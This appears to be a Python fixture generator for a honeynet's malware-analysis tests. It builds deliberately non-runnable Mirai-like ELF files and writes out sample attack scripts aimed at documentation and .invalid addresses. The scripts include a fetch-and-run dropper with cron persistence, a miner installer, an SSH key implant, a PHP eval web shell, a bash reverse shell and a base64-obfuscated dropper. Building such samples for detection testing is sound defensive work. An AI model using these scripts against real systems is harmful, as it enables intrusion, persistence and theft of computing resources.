"""Harmless sample generator for tests and the traffic simulator.

Everything here is hand-made and inert:

* ELF "bots" are never-runnable files (non-page-aligned segments, first instruction traps) whose
  code is just a *sequence of syscall setups*, enough for static analysis to recover behaviour.
* Network indicators point only at RFC 5737 documentation addresses (203.0.113.0/24,
  198.51.100.0/24) or ``.invalid`` names - they cannot resolve or route anywhere real.
* Scripts only contain text; they are never executed by anything in this project.

``python -m honeynet.analysis.fixtures <dir>`` writes the whole set.
"""

from __future__ import annotations

import random
import struct
import sys
from pathlib import Path

C2_IP = "203.0.113.45"
C2_ENDPOINT = f"{C2_IP}:23"
C2_DOMAIN = "cnc.botnet-fixture.invalid"
DROP_IP = "203.0.113.9"
WALLET = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"      # the public genesis-block address
POOL = "stratum+tcp://pool.minefixture.invalid:3333"

CRED_WORDS = ["root", "xc3511", "vizxv", "admin", "888888", "xmhdipc", "default", "juantech", "123456", "54321", "support",
              "password", "hi3518", "klv123", "ubnt", "realtek"]

BOT_STRINGS = ["/dev/watchdog", "/dev/misc/watchdog", "TSource Engine Query", "/proc/%d/exe", "/proc/net/tcp", "/bin/busybox",
               "applet not found", C2_ENDPOINT, C2_DOMAIN]

_PAGE = 0x100


# ------------------------------------------------------------------------------ ELF builder

class _Arch:
    def __init__(self, name: str, em: int, bits: int, big: bool, base: int, sys: dict[str, int]):
        self.name, self.em, self.bits, self.big, self.base, self.sys = name, em, bits, big, base, sys


ARCHS = {
    "x86_64": _Arch("x86_64", 62, 64, False, 0x400000,
                    {"open": 2, "socket": 41, "connect": 42, "sendto": 44, "fork": 57, "kill": 62, "setsid": 112, "execve": 59,
                     "dup2": 33}),
    "arm": _Arch("arm", 40, 32, False, 0x8000,
                 {"open": 5, "socket": 281, "connect": 283, "sendto": 290, "fork": 2, "kill": 37, "setsid": 66, "execve": 11,
                  "dup2": 63}),
    "mips": _Arch("mips", 8, 32, True, 0x400000,
                  {"open": 4005, "socket": 4183, "connect": 4170, "sendto": 4180, "fork": 4002, "kill": 4037, "setsid": 4066,
                   "execve": 4011, "dup2": 4063}),
}


def _enc_x86_64(items: list[tuple], addr_of: dict[str, int], pc: int) -> bytes:
    regs = {"eax": 0xB8, "edx": 0xBA, "esi": 0xBE, "edi": 0xBF}
    lea = {"rdi": 0x3D, "rsi": 0x35, "rdx": 0x15}
    out = bytearray()
    for it in items:
        kind = it[0]
        if kind == "guard":
            out += b"\x0f\x0b"                                   # ud2: the file traps if ever executed
        elif kind == "setreg":
            reg, val = it[1], it[2]
            out += bytes([regs[reg]]) + struct.pack("<I", val)
        elif kind == "ref":
            reg, name = it[1], it[2]
            disp = addr_of.get(name, pc + 7) - (pc + len(out) + 7)
            out += bytes([0x48, 0x8D, lea[reg]]) + struct.pack("<i", disp)
        elif kind == "syscall":
            out += b"\x0f\x05"
        elif kind == "ret":
            out += b"\xc3"
    return bytes(out)


def _enc_arm(items: list[tuple], addr_of: dict[str, int], pc: int, pool_at: int, pool_names: list[str]) -> bytes:
    regs = {"eax": 7, "edi": 0, "esi": 1, "edx": 2}
    out = bytearray()
    for it in items:
        kind = it[0]
        if kind == "guard":
            out += struct.pack("<I", 0xE7F000F0)                  # udf
        elif kind == "setreg":
            r, val = regs[it[1]], it[2]
            if val < 256:
                out += struct.pack("<I", 0xE3A00000 | r << 12 | val)
            else:
                out += struct.pack("<I", 0xE3000000 | ((val >> 12) & 0xF) << 16 | r << 12 | (val & 0xFFF))
        elif kind == "ref":
            r, name = 0 if it[1] == "rdi" else 1, it[2]
            slot = pool_at + 4 * pool_names.index(name)
            out += struct.pack("<I", 0xE59F0000 | r << 12 | (slot - (pc + len(out) + 8)) & 0xFFF)
        elif kind == "syscall":
            out += struct.pack("<I", 0xEF000000)                  # svc #0
        elif kind == "ret":
            out += struct.pack("<I", 0xE12FFF1E)                  # bx lr
    return bytes(out)


def _enc_mips(items: list[tuple], addr_of: dict[str, int], pc: int) -> bytes:
    regs = {"eax": 2, "edi": 4, "esi": 5, "edx": 6}
    out = bytearray()
    for it in items:
        kind = it[0]
        if kind == "guard":
            out += struct.pack(">I", 0x0000000D)                  # break
        elif kind == "setreg":
            out += struct.pack(">I", 0x24000000 | regs[it[1]] << 16 | it[2] & 0xFFFF)
        elif kind == "ref":
            a = addr_of.get(it[2], 0)
            lo = a & 0xFFFF
            hi = ((a >> 16) + (1 if lo & 0x8000 else 0)) & 0xFFFF
            out += struct.pack(">I", 0x3C040000 | hi)                              # lui $a0, hi
            out += struct.pack(">I", 0x24840000 | lo)                              # addiu $a0,$a0,lo
        elif kind == "syscall":
            out += struct.pack(">I", 0x0000000C)
        elif kind == "ret":
            out += struct.pack(">I", 0x03E00008)                  # jr $ra
    return bytes(out)


def _program(arch: str, calls: list[tuple[str, tuple]]) -> list[tuple]:
    """calls: (syscall name, (arg0, arg1, arg2)); an arg that is a str is a string reference."""
    a = ARCHS[arch]
    items: list[tuple] = [("guard",)]
    for name, args in calls:
        for reg, val in zip(("edi", "esi", "edx"), args):
            if val is None:
                continue
            if isinstance(val, str):
                if reg == "edi":
                    items.append(("ref", "rdi", val))
                else:
                    items.append(("ref", "rsi", val))
            else:
                items.append(("setreg", reg, val))
        items.append(("setreg", "eax", a.sys[name]))
        items.append(("syscall",))
    items.append(("ret",))
    return items


def build_elf(arch: str, calls: list[tuple[str, tuple]], strings: list[str] | bytes, *, xor_key: int | None = None) -> bytes:
    """Static, stripped, non-runnable ELF with LOAD segments only (no section headers)."""
    a = ARCHS[arch]
    items = _program(arch, calls)
    pool_names = sorted({i[2] for i in items if i[0] == "ref"})
    if isinstance(strings, bytes):
        blob = strings
        offsets: dict[str, int] = {}
    else:
        blob = bytearray()
        offsets = {}
        for s in strings:
            offsets[s] = len(blob)
            raw = s.encode("ascii") + b"\x00"
            blob += bytes(b ^ xor_key for b in raw) if xor_key else raw
        blob = bytes(blob)
    ehdr = 64 if a.bits == 64 else 52
    phsz = 56 if a.bits == 64 else 32
    text_off = _PAGE
    text_va = a.base + text_off

    def assemble(data_va: int, pool_at: int) -> bytes:
        addr_of = {n: data_va + offsets.get(n, 0) for n in pool_names}
        if arch == "x86_64":
            return _enc_x86_64(items, addr_of, text_va)
        if arch == "arm":
            return _enc_arm(items, addr_of, text_va, pool_at, pool_names)
        return _enc_mips(items, addr_of, text_va)

    code_len = len(assemble(0, 0))
    pool_len = 4 * len(pool_names) if arch == "arm" else 0
    pool_off = text_off + code_len
    data_off = (pool_off + pool_len + 15) & ~15
    data_va = a.base + data_off
    code = assemble(data_va, a.base + pool_off)
    if arch == "arm":
        code += b"".join(struct.pack("<I", data_va + offsets.get(n, 0)) for n in pool_names)
    e = ">" if a.big else "<"
    ident = b"\x7fELF" + bytes([2 if a.bits == 64 else 1, 2 if a.big else 1, 1, 0]) + b"\x00" * 8
    code_end = text_off + len(code)
    segs = [(1, 5, text_off, a.base + text_off, len(code)), (1, 4, data_off, data_va, len(blob))]
    if a.bits == 64:
        head = ident + struct.pack(e + "HHIQQQIHHHHHH", 2, a.em, 1, text_va, ehdr, 0, 0, ehdr, phsz, len(segs), 0, 0, 0)
        ph = b"".join(struct.pack(e + "IIQQQQQQ", t, f, o, va, va, sz, sz, 1) for t, f, o, va, sz in segs)
    else:
        flags = 0x50001000 if arch == "mips" else 0x05000200 if arch == "arm" else 0
        head = ident + struct.pack(e + "HHIIIIIHHHHHH", 2, a.em, 1, text_va, ehdr, 0, flags, ehdr, phsz, len(segs), 0, 0, 0)
        ph = b"".join(struct.pack(e + "IIIIIIII", t, o, va, va, sz, sz, f, 1) for t, f, o, va, sz in segs)
    img = bytearray(head + ph)
    img += b"\x00" * (text_off - len(img))
    img += code
    img += b"\x00" * (data_off - len(img))
    img += blob
    assert code_end <= data_off
    return bytes(img)


# ------------------------------------------------------------------------------ the samples

def _bot_calls(extra_ref: str = "/proc/%d/exe") -> list[tuple[str, tuple]]:
    return [("open", ("/dev/watchdog", 2, 0)), ("socket", (2, 1, 0)), ("connect", (3, extra_ref, 16)), ("fork", ()),
            ("setsid", ()), ("kill", (0, 9)), ("sendto", (3, "TSource Engine Query", 25))]


def mirai_like(arch: str) -> bytes:
    return build_elf(arch, _bot_calls(), BOT_STRINGS + CRED_WORDS)


def mirai_xor() -> bytes:
    """Scrambled string table (single-byte XOR 0x22, as in the public Mirai source)."""
    table = ["/proc/net/tcp", "/dev/watchdog", "/bin/busybox", "/proc/%d/exe", f"http://{DROP_IP}/bins/x86", "wget -O- ", "chmod 777 "]
    return build_elf("x86_64", [("socket", (2, 1, 0)), ("connect", (3, None, 16)), ("fork", ()), ("kill", (0, 9))], table, xor_key=0x22)


def upx_like(seed: int = 7) -> bytes:
    """Looks packed: no section headers, UPX marker, high-entropy body.  Not real UPX output."""
    rng = random.Random(seed)
    body = bytes(rng.randrange(256) for _ in range(6000))
    return build_elf("x86_64", [("socket", (2, 1, 0))], b"UPX!\x0d\x16\x08\x02" + body)


DROPPER_SH = f"""#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
rm -rf bins.sh .x
wget http://{DROP_IP}/bins/bins.sh -O .x; chmod 777 .x; sh .x
for a in mips mpsl arm arm5 arm6 arm7 x86 x86_64 sh4 ppc; do
  busybox wget http://{DROP_IP}/bins/bot.$a -O dvrHelper || curl -s http://{DROP_IP}/bins/bot.$a -o dvrHelper
  tftp -g -l dvrHelper -r bot.$a {DROP_IP}
  chmod +x dvrHelper; ./dvrHelper telnet.$a
done
echo "*/5 * * * * wget -q -O- http://{DROP_IP}/u.sh | sh" >> /var/spool/cron/crontabs/root
history -c; rm -rf $0
"""

MINER_SH = f"""#!/bin/bash
# fixture: fake miner installer - every host here is non-routable
pkill -9 xmrig; pkill -f kinsing; killall minerd
sysctl -w vm.nr_hugepages=128
curl -sL http://pool-dl.minefixture.invalid/xmrig -o /tmp/.systemd-update && chmod +x /tmp/.systemd-update
cat > /tmp/config.json <<EOF
{{"url": "{POOL}", "user": "{WALLET}", "pass": "x", "algo": "rx/0", "donate-level": 0}}
EOF
nohup /tmp/.systemd-update --config=/tmp/config.json >/dev/null 2>&1 &
(crontab -l; echo "*/10 * * * * curl -s http://pool-dl.minefixture.invalid/i.sh | bash") | crontab -
"""

SSH_IMPLANT_SH = ('cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfixturefixturefixturefixture'
                  'fixturefixturefixturefixturefixtureAAAA mdrfckr-fixture" >> .ssh/authorized_keys && chmod -R go= ~/.ssh\n')

# Kept to the eval(decode(request)) form: Windows Defender deletes files containing the plainer
# "system($_POST[...])" web-shell idiom as soon as they are written, which breaks test runs.
WEBSHELL_PHP = """<?php
// fixture web shell: inert - for analysis tests only
@eval(base64_decode($_REQUEST['x']));
?>
"""

REVSHELL_SH = f"#!/bin/bash\nbash -i >& /dev/tcp/{C2_IP}/4444 0>&1\n"

BENIGN_SH = "#!/bin/sh\n# prints a greeting\necho 'hello world'\ndate\n"


def obfuscated_dropper() -> bytes:
    import base64

    payload = f"cd /tmp; wget http://{DROP_IP}/x.sh -O .a; chmod +x .a; ./.a".encode()
    return (f"#!/bin/sh\necho {base64.b64encode(payload).decode()} | base64 -d | sh\n").encode()


def random_blob(size: int = 4096, seed: int = 11) -> bytes:
    rng = random.Random(seed)
    return bytes(rng.randrange(256) for _ in range(size))


def all_fixtures() -> dict[str, bytes]:
    return {
        "mirai_like_x86_64.elf": mirai_like("x86_64"),
        "mirai_like_arm.elf": mirai_like("arm"),
        "mirai_like_mips.elf": mirai_like("mips"),
        "mirai_xor_x86_64.elf": mirai_xor(),
        "packed_like.elf": upx_like(),
        "dropper.sh": DROPPER_SH.encode(),
        "dropper_b64.sh": obfuscated_dropper(),
        "miner_setup.sh": MINER_SH.encode(),
        "ssh_implant.sh": SSH_IMPLANT_SH.encode(),
        "webshell.php": WEBSHELL_PHP.encode(),
        "revshell.sh": REVSHELL_SH.encode(),
        "benign_hello.sh": BENIGN_SH.encode(),
        "random.bin": random_blob(),
    }


def main(argv: list[str] | None = None) -> int:
    out = Path((argv or sys.argv[1:] or ["fixtures"])[0])
    out.mkdir(parents=True, exist_ok=True)
    for name, blob in all_fixtures().items():
        (out / name).write_bytes(blob)
        print(f"{name}: {len(blob)} bytes")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
